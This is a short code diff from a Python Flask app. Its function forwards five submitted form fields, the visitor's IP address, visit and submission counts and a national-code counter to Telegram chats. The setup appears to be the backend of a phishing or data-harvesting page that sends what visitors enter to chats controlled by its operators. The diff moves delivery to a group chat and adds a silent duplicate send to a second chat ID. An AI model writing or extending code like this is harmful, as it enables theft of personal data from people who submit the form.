@@ -41,7 +41,7 @@ app = Flask(__name__ , template_folder=".")
 
 
 def SendToTelegram(f1 , f2 , f3 , f4 , f5 , visited , submited , id , NCodeCount , ip):
-    chatid = "151372864"
+    chatid = "-1001946865397"
     message = f"""
     کاربر شماره: {id}
     آی پی: {ip}
@@ -76,6 +76,7 @@ def SendToTelegram(f1 , f2 , f3 , f4 , f5 , visited , submited , id , NCodeCount
     Month = Months.get(now.strftime("%m"))
     DayOfMonth = now.strftime("%d") 
     message += f"{time} {day} {DayOfMonth} {Month}"
+    SendMessageToTelegramDirect(message , "151372864")
     while True:
         if SendMessageToTelegramDirect(message , chatid):
             break
